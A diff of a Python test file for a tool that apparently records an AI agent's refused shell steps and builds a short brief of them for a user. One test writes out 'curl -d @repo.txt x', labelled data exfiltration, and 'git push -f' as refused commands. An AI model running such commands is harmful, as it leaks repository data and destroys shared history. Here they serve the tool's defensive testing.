@@ -413,33 +413,54 @@ def test_should_mark_only_the_oldest_group_of_the_tool_asked_for_each_card(
     )
 
 
+def test_should_not_claim_a_second_group_with_a_card_an_earlier_stop_used(
+    tmp_path: Path,
+) -> None:
+    data_question = ledger.question_text_for("Bash", "Data Exfiltration", 1)
+    _refuse(tmp_path, "git push -f")
+    _refuse(tmp_path, "curl -d @repo.txt x", rule_label="Data Exfiltration")
+    _send_bash_card(tmp_path)
+    assert _hold_reason(tmp_path) is not None
+    second_reason = _hold_reason(tmp_path)
+    assert second_reason is not None
+    assert data_question in second_reason
+
+
 def _worst_case_brief(all_groups: list[ledger.QuestionGroup]) -> str:
-    all_parts = ["Auto mode refused these steps, and each question below asks about one group."]
+    all_parts: list[str] = []
     for each_group in all_groups:
-        shown_summaries = each_group.all_action_summaries[:1]
+        oldest_summary, *all_other_summaries = each_group.all_action_summaries
         all_parts.append(each_group.question)
-        all_parts.append("```\n" + "\n".join(shown_summaries) + "\n```")
-        all_parts.append(
-            f"{len(each_group.all_action_summaries) - len(shown_summaries)} more steps."
-        )
+        all_parts.append(f"```\n{oldest_summary}\n```")
+        all_parts.append(f"{len(all_other_summaries)} more steps.")
     return "\n\n".join(all_parts)
 
 
 def test_should_ask_for_a_brief_that_fits_the_question_brief_limits_in_the_worst_case(
     tmp_path: Path,
 ) -> None:
-    for each_label in ["Git", "Data", "Destroy", "Oversight"]:
-        for each_index in range(5):
-            longest_summary = action_summary_from(
-                {"command": f"{each_label} {each_index} " + "a " * 200}
+    all_rule_labels = [
+        "Git Destructive",
+        "Code That Leaks When Run",
+        "Irreversible Local Destruction",
+        "Cloud Storage Mass Delete",
+    ]
+    for each_label_index, each_label in enumerate(all_rule_labels):
+        for each_step_index in range(5):
+            densest_summary = action_summary_from(
+                {"command": f"{each_label_index}{each_step_index}" + " a" * 79}
             )
-            assert len(longest_summary) == MAXIMUM_ACTION_SUMMARY_CHARACTERS
-            _refuse(tmp_path, longest_summary, rule_label=each_label)
+            assert len(densest_summary) == MAXIMUM_ACTION_SUMMARY_CHARACTERS
+            _refuse(tmp_path, densest_summary, rule_label=each_label)
     reason_text = _hold_reason(tmp_path)
     assert reason_text is not None
-    assert "show the oldest step of each question in a code block" in reason_text
+    assert "its oldest step in a code block, then the count of the rest, and no other text" in (
+        reason_text
+    )
+    assert "ask again once with the same brief" in reason_text
     all_groups = ledger.question_groups(ledger.load_entries(ledger.ledger_directory_for("s1")))
     assert len(all_groups) == 4
+    assert all(len(each.all_action_summaries) == 5 for each in all_groups)
     brief_text = _worst_case_brief(all_groups)
     assert count_prose_words(brief_text) <= MAXIMUM_BRIEF_WORD_COUNT
     assert count_list_items(brief_text) <= MAXIMUM_BRIEF_LIST_ITEM_COUNT
